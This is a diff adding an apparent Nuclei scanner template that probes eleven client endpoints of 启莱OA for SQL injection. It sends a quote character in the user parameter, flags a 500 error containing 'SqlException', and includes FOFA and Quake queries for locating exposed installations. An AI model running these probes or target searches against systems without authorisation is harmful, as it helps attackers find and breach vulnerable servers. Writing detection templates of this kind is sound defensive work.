@@ -1,0 +1,40 @@
+id: qilai-oa-mutli-sqli
+info:
+  name: qilai oa mutli interface - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-qilai-OA-CloseMsg.aspx-sqli.yml
+  metadata:
+    verified: false
+    max-request: 1
+    fofa-query: app="启莱OA"
+    hunter-query: 
+    quake-query: app:"启莱OA"
+    tips:
+    repair:
+  tags: qilai,oa,sqli
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/client/GetUser.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/CloseMsg.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/Taolunzu.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/checkuser.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/messageurl.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/mymessage.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/mymeunclient.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/treelist.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/checkuser.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/useronline.aspx?user=1'&pwd=1"
+      - "{{BaseURL}}/client/useronlineol.aspx?user=1'&pwd=1"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains(body,'SqlException')
+        condition: and
